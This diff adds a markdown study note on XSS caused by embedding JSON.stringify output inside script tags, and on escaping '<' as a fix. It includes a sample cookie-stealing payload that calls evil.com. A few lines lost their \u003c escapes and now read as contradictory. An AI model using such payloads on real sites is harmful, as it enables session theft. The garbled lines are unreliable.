@@ -1,0 +1,136 @@
+---
+title: 'JSON Inside a Script Tag: The Escape JSON.stringify Cannot Stop'
+created: '2026-06-05'
+status: 'budding'
+parent: 'frontend-network'
+tags: ['frontend', 'network', 'security', 'xss']
+---
+
+Embedding JSON-LD in a `<script type="application/ld+json">` to feed structured data to search engines for SEO, or stuffing server-built initial state into `window.__INITIAL_STATE__` to hand off to the client — these patterns are everywhere. And when you serialize that data with `JSON.stringify`, have you ever waved it through thinking "this is safe"? That belief quietly falls apart in the peculiar spot that is the inside of a `<script>` tag.
+
+> One-line summary: **Escaping rides on context. `JSON.stringify` is just a serializer for the JSON context; it can't stop an escape in the HTML context of a `<script>` tag.**
+
+## The Browser Sees the Inside of a Script as Nothing but a Blob of Characters
+
+First we have to nail down how the browser's HTML parser reads the inside of a `<script>`. The parser does **not** interpret the contents of a `<script>` as JavaScript. Inside, it's "raw text" — just a blob of characters — and the one and only thing the parser looks for there is the **closing-tag string** (the `</script` form, with the slash).
+
+Here's the decisive fact. The parser has **no idea whatsoever** that this closing-tag string happens to sit "inside a JS string literal." Inside the quotes or outside them, if the characters line up, it closes the tag right there.
+
+```
+<script>
+  window.__STATE__ = {"title":"...</script><script>evil()..."};
+                              ▲
+                  parser: "oh, a closing tag!" the script ends here
+                              │
+        ┌─────────────────────┴──────────────────────┐
+        │ the earlier script terminates               │
+        │ a new <script>evil()...</script> appears    │ ← this gets executed
+        └────────────────────────────────────────────┘
+```
+
+To JS it was just characters living inside the `title` string, but to the parser it's an unmistakable closing tag. This mismatch in perspective is where the incident begins.
+
+> Why was it designed this way? If the HTML parser tried to understand JS syntax inside a `<script>`, the parser would have to embed an entire JS engine. So the spec pinned the parser's job down to the simple "just find the closing token." The price of that simplicity: responsibility for "the case where a closing-tag string gets mixed into the data" lands on whoever embeds the data.
+
+## What JSON.stringify Does and Doesn't Do
+
+So what does `JSON.stringify` escape? Exactly — and only — "the things that must not break in the JSON context."
+
+| Character                     | JSON.stringify handling  | Reason                                    |
+| ----------------------------- | ------------------------ | ----------------------------------------- |
+| `"` (double quote)            | escaped to `\"` YES      | it's the boundary of a JSON string        |
+| `\` (backslash)               | escaped to `\\` YES      | it's the escape-starting character        |
+| control chars (newline, etc.) | escaped to `\n` etc. YES | can't be put raw inside a JSON string     |
+| `<`, `>` (angle brackets)     | left as-is NO            | JSON spec imposes no obligation to escape |
+| `&` (ampersand)               | left as-is NO            | likewise nothing special in JSON          |
+
+The last two rows are the crux. `<` and `>` mean nothing in JSON grammar, so `JSON.stringify` doesn't touch them. As a result, the character combination `</script>` **can survive intact** inside the output string. Output that's perfectly valid in the JSON context becomes a weapon the moment it's moved into the HTML context. The serializer did its whole job. It's just that its job was a different job from "HTML safety."
+
+## The Attack Arrives as Perfectly Ordinary Data
+
+It doesn't even take special input. All it takes is a closing tag plus a malicious tag mixed into an ordinary user-input field like a post title or a comment.
+
+```ts
+// Say a user put this string into a post title
+const post = {
+  title: 'Restaurant review</script><script>fetch("//evil.com?c="+document.cookie)</script>',
+};
+
+// JSON-LD or initial state, the moment you serialize this into a script
+const html = `<script type="application/ld+json">${JSON.stringify(post)}</script>`;
+// the browser parser closes the tag at the </script> inside title,
+// and actually executes the following <script>fetch(...)</script>
+```
+
+Here's a spot that's easy to misread. This isn't a problem only when you concatenate strings directly on the server. Whether you render the JSON-LD script via React's `dangerouslySetInnerHTML`, or stitch strings together in a server template, **the instant you let the serialized result flow straight into the HTML context** you get hit the same way. Whatever the conduit, if the context is the same, so is the result.
+
+## The Defense Is a Single Line, Right Before Injection
+
+The fix is, **right before** embedding the data into the HTML context, to block `<` so the parser can't find a closing tag.
+
+```ts
+const safe = JSON.stringify(data).replace(/</g, '\\u003c');
+```
+
+`<` is `<` expressed as its Unicode code point. Inside a JSON/JS string, `<` is **100% identical in parse result** to `<` — that is, not a single character of the data value changes. Yet in the eyes of the HTML parser there's no longer a `<` to see, so it can never find the closing-tag string `</script>`. A one-line defense with zero side effects.
+
+```
+original: ..."</script>..."     → parser finds the closing tag (dangerous)
+defended: ..."</script>..." → parser sees no < (safe)
+        ↑ when JS reads it, it's restored to the same characters "</script>"
+```
+
+As a bonus, one more line makes it complete. `U+2028` (line separator) and `U+2029` (paragraph separator) are characters that can be **interpreted as line breaks inside a JS string literal and cause a syntax error**. Escape these two the same way.
+
+```ts
+const safe = JSON.stringify(data)
+  .replace(/</g, '\\u003c')
+  .replace(/\u2028/g, '\\u2028')
+  .replace(/\u2029/g, '\\u2029');
+```
+
+Frameworks like Next.js do exactly this internally for the data they embed (hydration state, for instance). Still, don't relax too soon. **The moment I assemble a `<script>` myself, that responsibility comes to me, not the framework.**
+
+> Why is blocking only `<` enough? The sole trigger that pulls the parser out of `<script>` raw-text mode is a closing tag that starts with `<`. Block the single `<` from being promoted from a character to a code trigger, and no matter what string follows, the parser keeps reading it as raw text. You close the widest surface by sealing the narrowest single spot.
+
+## The Principle: Escape at the Boundary, by the Rules of That Context
+
+More important than memorizing this one-line defense is the principle behind it. At the **very point** where data crosses a trust boundary (the dividing line between a trusted region and an untrusted one), escape it **by the rules of that context** — "sanitize at the boundary."
+
+| Where the data goes         | Dangerous characters       | Who escapes it                   |
+| --------------------------- | -------------------------- | -------------------------------- |
+| HTML body (JSX children)    | `<`, `>`, `&`              | React, automatically             |
+| JSON inside `<script>`      | `<`, U+2028/U+2029         | **me, by hand** (the line above) |
+| URL attributes (href, etc.) | schemes like `javascript:` | me, via scheme validation        |
+
+The reason React's `{children}` is safe is that React **escapes for the HTML context automatically**. But the inside of a `<script>` is not the HTML context React touches; it's a separate context where I build and insert the string myself. Even for the same data, the characters you must block differ depending on which context it heads into — this is the substance of saying escaping rides on context. The general theory of XSS and the principle of context-specific escaping are covered more broadly in [[web-security-xss-csrf]].
+
+One last habit. If you **pin down, as a regression test**, a malicious input string that once burned you or that you judged dangerous, you can prevent the kind of accident where the defense quietly drops out while you're refactoring the serialization code later.
+
+## Common Misconceptions
+
+- **Misconception**: "It went through `JSON.stringify`, so escaping is done." → **Reality**: That's escaping for the JSON context only. `<`, `>`, `&` are untouched by the JSON spec, so `</script>` survives in the output verbatim. The moment it crosses into the HTML context, you have to escape again.
+- **Misconception**: "If I use React, I'm free from XSS." → **Reality**: React's automatic escaping applies only to HTML-body contexts like `{children}`. A script rendered via `dangerouslySetInnerHTML` or a `<script>` I assembled by hand is outside React's jurisdiction, and that responsibility is mine.
+- **Misconception**: "JSON-LD is metadata for search engines, so it's not dangerous." → **Reality**: Body text such as post titles and descriptions goes right into it. If a user plants a closing tag in the title, it gets interpreted as markup as-is.
+- **Misconception**: "Just turn the angle brackets into HTML entities like `&lt;`." → **Reality**: The inside of a `<script>` is raw text, so HTML entities aren't decoded. `&lt;` gets mixed into the data literally and breaks the JSON. Here you have to use `<`, which is valid in the JS context.
+
+## Check Yourself
+
+- How does the browser's HTML parser treat the inside of a `<script>`, and what triggers it to close the tag in there?
+- Why doesn't `JSON.stringify` escape `<` and `>`, and why does that become a problem only in the `<script>` context?
+- Can you explain why changing it to `<` doesn't alter the data value JS reads?
+- Why does blocking just the single `<` stop injection of a closing `</script>` tag?
+- Can you distinguish the contexts where React's automatic escaping applies from those where it doesn't?
+- Why does handling U+2028/U+2029 as well make it complete?
+
+## Related Notes
+
+- [[web-security-xss-csrf]]
+- [[oauth-callback-security]]
+- [[browser-script-loading]]
+- [[frontend-network]]
+
+## References
+
+- [Cross Site Scripting Prevention Cheat Sheet - OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
+- [The script element - HTML Standard (WHATWG)](https://html.spec.whatwg.org/multipage/scripting.html)
